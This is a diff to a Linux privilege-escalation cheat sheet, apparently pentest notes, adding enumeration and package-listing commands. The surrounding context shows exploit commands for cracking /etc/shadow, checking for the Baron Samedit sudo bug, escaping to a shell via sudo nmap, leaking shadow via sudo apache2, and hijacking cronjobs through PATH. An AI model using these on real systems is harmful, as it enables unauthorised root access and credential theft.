@@ -82,17 +82,26 @@
 
 ## Quick Enumeration Commands  
     hostname; ip addr;    
-    whoami; id   
+    whoami; id     #prints your EUID / ID   
+    who     #logged in users  
     uname -r   
+    cat /etc/*-release   
     su -, su root (no password, root, password) 
     sudo -l  
     ps -aux | grep root 
     netstat -antp   
-    
+
+Installed apps 
+
+    ls -lh /usr/bin/
+    ls -lh /sbin/
+    rpm -qa     #all packages installed on RPM based Linux system   
+    dpkg -l     #all packages on Debian based Linux   
 ### Important Files to Check 
     cat /etc/passwd | grep /bin/bash   
     ls -al /etc/shadow       #crack with hashcat -m 1800  
-    ls -al /etc/passwd 
+    ls -al /etc/passwd   
+    /etc/group  
     /etc/sudoers
     /etc/hosts               #local DNS entries 
     
@@ -111,7 +120,6 @@ run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with incr
 [Docker and Container escapes - DEEPCE](https://github.com/stealthcopter/deepce)   
 [SUDO Killer: sudo exploits](https://github.com/TH3xACE/SUDO_KILLER)  
 [Uptux - Specialized priv esc checks](https://github.com/initstring/uptux) 
-
 
 ## Sudo exploits 
 [SUDO_KILLER enum script](https://github.com/TH3xACE/SUDO_KILLER)  
@@ -158,7 +166,11 @@ any unpatched version of the sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1
     sudoedit -s '\' $(python3 -c 'print("A"*1000)')                  #check to see if machine is exploitable 
 
 ## Misc sudo binaries  
+nmap 
+
     echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse  
+apache2
+
     sudo apache2 -f /etc/shadow
 
 ## Cronjobs    
@@ -167,7 +179,7 @@ look for scripts you can write to running as a cronjob, writeable cron directory
     cat /etc/crontab  
     crontab -l    
     ls -al /etc/cron* 
-## PATH variable 
+### PATH variable 
 If a cronjob doesn’t use an absolute path and one of path dirs is writable by user: can create a script with the same name as the cron job so it is executed. 
 default /usr/bin:/bin 
 
